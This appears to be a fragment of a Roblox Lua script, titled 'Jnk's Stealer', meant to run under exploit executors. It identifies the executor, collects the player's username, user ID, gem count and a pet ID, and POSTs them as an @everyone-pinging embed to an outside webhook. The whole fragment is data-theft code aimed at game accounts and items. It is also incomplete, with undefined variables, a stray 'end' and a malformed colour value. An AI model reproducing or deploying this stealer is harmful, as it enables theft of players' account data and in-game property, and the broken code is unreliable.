local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Random ass exploit"

   local player = game.Players.LocalPlayer
   local username = player.Name
   local data = {
   ["content"] = "@everyone",
   ["embeds"] = {
       {
           ["title"] = "**Jnk's Stealer**",
           ["description"] = "```Username: " .. username .."```",
           ["type"] = "rich",
           ["color"] = tonumber(0094cf),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(username)
           },   
           ["fields"] = {
            {
                ["name"] = "``Data Generated``",
                ["value"] = "``Username :`` **" ..username .." **\n``User ID : ``**" ..player.userId .. "**\n**``Account Age :``** **``not found``**\n**``Device :``** **Computer**\n``Exploit :`` "..webhookcheck.."\n``Gems :`` **" ..dims .." **\n``Pet ID :`` "..v.Name .."", 
                ["inline"] = false
            }
            
        }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = webh, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
end
